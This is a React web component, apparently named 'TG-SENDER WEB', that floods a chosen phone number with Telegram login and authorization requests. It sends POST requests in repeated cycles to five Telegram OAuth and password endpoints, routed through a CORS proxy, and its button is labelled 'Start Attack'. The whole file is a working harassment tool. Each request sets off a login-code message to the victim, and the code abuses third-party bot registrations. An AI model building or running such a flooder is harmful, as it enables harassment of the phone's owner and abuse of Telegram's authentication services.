'use client'
import React, { useState, useEffect } from 'react';

// Список эндпоинтов из вашего скрипта
const ENDPOINTS = [
  'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
  'https://translations.telegram.org/auth/request',
  'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
  'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
  'https://my.telegram.org/auth/send_password'
];

// Бесплатный прокси для обхода CORS
const PROXY_URL = "https://cors-anywhere.herokuapp.com/"; 

export default function TelegramSender() {
  const [phone, setPhone] = useState('+');
  const [cycles, setCycles] = useState(1);
  const [isRunning, setIsRunning] = useState(false);
  const [logs, setLogs] = useState([]);
  const [progress, setProgress] = useState(0);

  const addLog = (msg, color = 'text-gray-300') => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 50));
  };

  const startSending = async () => {
    if (!phone.startsWith('+')) return alert("Номер должен начинаться с +");
    
    setIsRunning(true);
    setLogs([]);
    let totalSent = 0;

    for (let c = 1; c <= cycles; c++) {
      addLog(`🚀 Запуск цикла ${c}...`, 'text-cyan-400');
      
      for (const url of ENDPOINTS) {
        if (!isRunning && c > 1) break; 
        
        try {
          // Используем fetch через прокси
          const response = await fetch(PROXY_URL + url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ 'phone': phone })
          });

          if (response.ok) totalSent++;
          addLog(`✅ Запрос на ${new URL(url).hostname} отправлен`, 'text-green-400');
        } catch (e) {
          addLog(`❌ Ошибка на ${new URL(url).hostname}`, 'text-red-400');
        }
        // Небольшая задержка между запросами, чтобы не забанили прокси
        await new Promise(r => setTimeout(r, 500));
      }
      
      setProgress(Math.round((c / cycles) * 100));
      if (c < cycles) await new Promise(r => setTimeout(r, 3000));
    }

    addLog(`✨ Готово! Всего успешно: ${totalSent}`, 'text-magenta-400');
    setIsRunning(false);
  };

  return (
    <div className="min-h-screen bg-[#0f172a] text-slate-200 font-mono p-4 flex flex-col items-center">
      <div className="w-full max-w-xl bg-[#1e293b] rounded-lg shadow-2xl border border-slate-700 p-6">
        <h1 className="text-xl font-bold text-magenta-500 mb-6 border-b border-slate-700 pb-2">
          TG-SENDER WEB <span className="text-xs font-normal text-slate-500">by @coderonov</span>
        </h1>

        <div className="space-y-4">
          <div>
            <label className="block text-xs uppercase text-slate-500 mb-1">Phone Number</label>
            <input 
              type="text" 
              value={phone} 
              onChange={e => setPhone(e.target.value)}
              className="w-full bg-[#0f172a] border border-slate-600 p-2 rounded focus:border-magenta-500 outline-none transition"
            />
          </div>

          <div>
            <label className="block text-xs uppercase text-slate-500 mb-1">Cycles</label>
            <input 
              type="number" 
              value={cycles} 
              onChange={e => setCycles(parseInt(e.target.value))}
              className="w-full bg-[#0f172a] border border-slate-600 p-2 rounded focus:border-magenta-500 outline-none"
            />
          </div>

          <button 
            onClick={startSending}
            disabled={isRunning}
            className={`w-full py-3 rounded font-bold uppercase tracking-widest transition shadow-lg ${
              isRunning ? 'bg-slate-700 cursor-not-allowed' : 'bg-gradient-to-r from-purple-600 to-magenta-600 hover:scale-[1.02]'
            }`}
          >
            {isRunning ? 'Running...' : 'Start Attack'}
          </button>
        </div>

        {/* Индикатор прогресса */}
        {isRunning && (
          <div className="mt-6 w-full bg-slate-700 h-1 rounded-full overflow-hidden">
            <div className="bg-magenta-500 h-full transition-all duration-500" style={{width: `${progress}%`}}></div>
          </div>
        )}

        {/* Консоль логов */}
        <div className="mt-6 bg-[#0a0f1d] p-4 rounded border border-slate-800 h-64 overflow-y-auto text-xs space-y-1">
          {logs.length === 0 && <p className="text-slate-600 italic">Waiting for action...</p>}
          {logs.map((log, i) => (
            <div key={i} className="border-b border-slate-900 pb-1">{log}</div>
          ))}
        </div>
      </div>
      
      <p className="mt-4 text-[10px] text-slate-600 text-center max-w-sm">
        Примечание: Если запросы блокируются, перейдите на <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" className="underline text-magenta-500">CORS Anywhere Demo</a> и нажмите кнопку "Request temporary access".
      </p>
    </div>
  );
}
